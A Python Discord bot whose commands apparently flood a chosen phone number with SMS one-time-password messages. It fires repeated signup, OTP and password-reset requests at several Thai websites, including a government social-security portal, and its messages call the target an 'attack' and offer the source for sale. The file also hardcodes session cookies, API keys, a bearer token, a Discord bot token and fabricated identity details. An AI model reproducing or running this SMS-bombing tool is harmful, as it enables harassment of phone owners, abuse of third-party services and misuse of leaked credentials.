import discord,requests,time
from discord.ext import commands

bot = commands.Bot(command_prefix="!", help_command=None)
@bot.event
async def on_ready():
    print(f"connection Bot {bot.user}")
    

    
        
            
                
                    
                        
                                
@bot.command()
async def otp(ctx,phone,jam:int):
    if (jam > 300):
        await ctx.channel.send("ยิงไม่เกิน300นะคะ")
    else:
        jam = 5
      
        
        emBed = discord.Embed(title="บอทกำลังทำงาน¥¥",description="กรุณารอ1-10นาทีนะคะ",color=0xff4612)
        emBed.add_field(name='Attack phoneber ',value=phone)
        
        ima = "https://i.pinimg.com/originals/ce/ba/34/ceba346bb202efd59acbca3db67c0d97.gif"
        emBed.set_image(url=ima)
        emBed.add_field(name="รอการยิงครั้งต่อไป",value="Sorce 100bath")
        
        await ctx.channel.send(embed=emBed)
                
                
        
        for i in range(jam+1):
            
             
            requests.get(f"https://www.scgexpress.co.th/member/getRegister?phone={phone}")
    
        headers = {
            "content-type": "application/x-www-form-urlencoded",
            "user-agent": "Mozilla/5.0 (Linux; Android 5.1.1; A37f) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/95.0.4638.74 Mobile Safari/537.36",
            "referer": "https://www.wongnai.com/guest2?_f=signUp&guest_signup_type=phone",
            "cookie": "_gcl_au=1.1.1123274548.1637746846"
            }
        requests.post("https://www.wongnai.com/_api/guest.json?_v=6.054&locale=th&_a=phoneLogIn",headers=headers,data=f"phoneno={phone}&retrycount=0")
            
        requests.post("https://gettgo.com/sessions/otp_for_sign_up", data={"mobile_number":phone})
        
        requests.post("https://api.true-shopping.com/customer/api/request-activate/mobile_no", data={"username": phone})
        
        requests.post("https://www.msport1688.com/auth/send_otp", data={"phone":phone})
        
        
    
        requests.post('https://www.sso.go.th/wpr/MEM/terminal/ajax_send_otp',headers = {"User-Agent": "Mozilla/5.0 (Linux; Android 10; Redmi 8A) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/94.0.4606.85 Mobile Safari/537.36","Content-Type": "application/x-www-form-urlencoded; charset=UTF-8","X-Requested-With": "XMLHttpRequest","Cookie": "sso_local_storeci_sessions=KHj9a18RowgHYWbh71T2%2FDFAcuC2%2FQaJkguD3MQ1eh%2FlwrUXvpAjJgrm6QKAja4oe7rglht%2BzO6oqblJ4EMJF4pqnY%2BGtR%2F0RzIFGN0Suh1DJVRCMPpP8QtZsF5yDyw6ibCMf2HXs95LvAMi7KUkIeaWkSahmh5f%2F3%2FqcOQ2OW5yakrMGA1mJ5upBZiUdEYNmxUAljcqrg7P3L%2BGAXxxC2u1bO09Oz4qf4ZV9ShO0gz5p5CbkE7VxIq1KUrEavn9Y%2BarQmsh1qIIc51uvCev1U1uyXfC%2F9U7uRl7x%2FVYZYT2pkLd3Q7qnZoSNBL8y9wge8Lt7grySdVLFhw9HB68dTSiOm1K04QhdrprI7EsTLWDHTgYmgyTQDuz63YjHsH5MUVanlfBISU1WXmRTXMKbUjlcl0LPPYUR9KWzrVL7sXcrCX%2FfUwLJIU%2F7MTtDYUx39y1CAREM%2F8dw7AEjcJAOA%3D%3D684b65b9b9dc33a3380c5b121b6c2b3ecb6f1bec; PHPSESSID=1s2rdo0664qpg4oteil3hhn3v2; TS01ac2b25=01584aa399fbfcc6474d383fdc1405e05eaa529fa33e596e5189664eb7dfefe57b927d8801ad40fba49f0adec4ce717dd5eabf08d7080e2b85f34368a92a47e71ef07861a287c40da15c0688649509d7f97eb2c293; _ga=GA1.3.1824294570.1636876684; _gid=GA1.3.1832635291.1636876684"},data=f"dCard=1358231116147&Mobile={phone}&password=098098Az&repassword=098098Az&perPrefix=Mr.&cn=Dhdhhs&sn=Vssbsh&perBirthday=5&perBirthmonth=5&perBirthyear=2545&Email=nickytom5879%40gmail.com&otp_type=OTP&otpvalue=&messageId=REGISTER")
        
        requests.post("https://api.mcshop.com/cognito/me/forget-password",headers={"x-store-token": "mcshop","user-agent": "Mozilla/5.0 (Linux; Android 10; Redmi 8A) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/94.0.4606.85 Mobile Safari/537.36","content-type": "application/json;charset=UTF-8","accept": "application/json, text/plain, */*","x-auth-token": "O2d1ZXN0OzkyMDIzOTU7YThmNWMyZDE4YThlOTMzOGMyOGMwYWE5ODQwNTBjY2I7Ozs7","x-api-key": "ZU2QOTDkCV5JYVkWXdYFL8niGXB8l1mq2H2NQof3"},json={"username": phone})
        
        requests.get(f"https://asv-mobileapp-prod.azurewebsites.net/api/Signin/SendOTP?phoneNo={phone}&type=Register")
        
       
        
        

        
        
       

@bot.command()
async def help(ctx):
    emBed = discord.Embed(title="วิธีใช้",description="Made By x2sword#6033",color=0xff4612)
    emBed.add_field(name="ยิงแบบรวมapi",value="$otp [เบอร์] [จำนวน]")
    emBed.add_field(name="ยิงapi (noc)",value="$noc [เบอร์] [จำนวน]")
    emBed.set_thumbnail(url="https://i.pinimg.com/originals/e9/6b/08/e96b08c82af933ed0396a1ee4d33fa1f.gif")
    await ctx.channel.send(embed=emBed)










            
             

    
@bot.command()
async def noc(ctx,phone,jam:int):
            if (jam > 151):
                await ctx.channel.send("ยิงไม่เกิน150นะคะ")
                
                
            else:
                emBed = discord.Embed(title="SmS Attacking ¥¥",description="Bot by: EH4404",color=0xff4612)
                emBed.add_field(name='Attack phoneber ',value=phone)
                
                ima = "https://thumbs.gfycat.com/BitesizedIdenticalAtlasmoth-max-1mb.gif"
                emBed.set_image(url=ima)
                await ctx.channel.send(embed=emBed)
                
                
                
                
    
    
                
                for i in range(jam+1):
                    requests.post("https://nocnoc.com/authentication-service/user/OTP?b-uid=1.0.663", json={
  "lang": "th",
  "userType": "BUYER",
  "locale": "th",
  "orgIdfier": "scg",
  "phone": phone,
  "type": "signup",
  "otpTemplate": "buyer_signup_otp_message",
  "userParams": {
    "buyerName": "ibteesam"
  }
}, headers={"authorization":"Bearer eyJ0eXAiOiJKV1QiLCJlbmMiOiJBMTI4Q0JDLUhTMjU2IiwiYWxnIjoiZGlyIn0..EjlRCeeVlwEMnAap7RD7_w.gmsXchvWAkPnGbtnfH4VS2m_awxyMcelD4wsmOuxNF1_BqS72z370qCxeNNsR-P2wsK_6qUNJ0ek4iSUPuTwV31WvXurXdzCBBF4iXIIOkNlHj-vka8Sy8zjin_E0CRurTFv8tsF6mpeYTA9lO3cxQ.hVTKUbtouY4LMpxVRXVpMw", "content-type": "application/json"})
time.sleep(1.4)
                    
                
                   
            
        

    
    
    
    
    
bot.run("OTQ5MjY2OTEwMzEzMzQwOTI5.YiH3sw.6P0JJTprv_25Il-2oU7q7IA6O3g")